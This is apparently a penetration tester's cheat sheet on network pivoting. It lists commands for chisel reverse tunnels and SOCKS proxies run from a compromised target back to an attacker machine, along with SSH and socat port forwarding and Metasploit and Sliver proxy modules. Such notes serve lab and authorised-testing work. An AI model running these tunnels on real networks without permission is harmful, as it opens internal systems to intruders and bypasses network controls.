---
title: "Network Traffic Pivoting"
date: 2024-6-26
tags: ["pivot", "chisel", "ssh", "metasploit", "network", "socat", "port forward", "tunneling"]
---

---
### Tunneling

{{< tab set1 tab1 active >}}Chisel{{< /tab >}}
{{< tab set1 tab2 >}}ssh{{< /tab >}}
{{< tab set1 tab3 >}}socat{{< /tab >}}
{{< tab set1 tab4 >}}metasploit{{< /tab >}}
{{< tab set1 tab5 >}}sliver{{< /tab >}}
{{< tabcontent set1 tab1 >}} 

#### Start a local chisel Server

<div>

```bash
# In our local Linux machine
./chisel server --reverse --port 8000
```

</div>

#### Ports forwarding

<div>

```bash
# In target machine
./chisel client 10.10.14.10:8000 R:8080:127.0.0.1:8080
```

```bash
# Mutiple ports fowarding, can be different targets in the same subnet
./chisel client 10.10.14.10:8000 R:8080:172.17.0.2:8080 R:5000:172.17.0.3:5000
```

</div>

#### Socks5

<div>

```bash
# In our local Linux machine
sudo nano /etc/proxychains4.conf
```

```bash
# Add to the end of the file
socks5 127.0.0.1 1080
```

```bash
# In target machine
./chisel client 10.10.11.10:8000 R:1080:socks
```

```bash
# Usage, in our local machine
proxychains4 curl http://127.0.0.1:1080
```

</div>

<small>*Ref: [chisel](https://github.com/jpillora/chisel)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

<div>

```bash
# SSH port forwarding without spawning a shell
ssh -N -L 8080:127.0.0.1:8080 <USER>@10.10.11.10
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

<div>

```bash
# Any traffic go to port 1337 will be forwarded to 10.10.14.10:1337
./socat tcp-listen:1337,fork tcp:10.10.14.10:1337 &
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab4 >}}

#### Ports forwarding

<div>

```bash
# Add
portfwd add -l 80 -r 127.0.0.1 -p 80
```

```bash
# Delete
portfwd delete -l 80 -r 127.0.0.1 -p 80
```

</div>

#### Socks5

<div>

```bash
# First add routes to target subnet
use post/multi/manage/autoroute
```

```bash
set session <ID>
```

```bash
run
```

```bash
# Then create socks proxy
use auxiliary/server/socks_proxy
```

```bash
run
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab5 >}}

<div>

```bash
socks5 start
```

</div>

{{< /tabcontent >}}

<br>

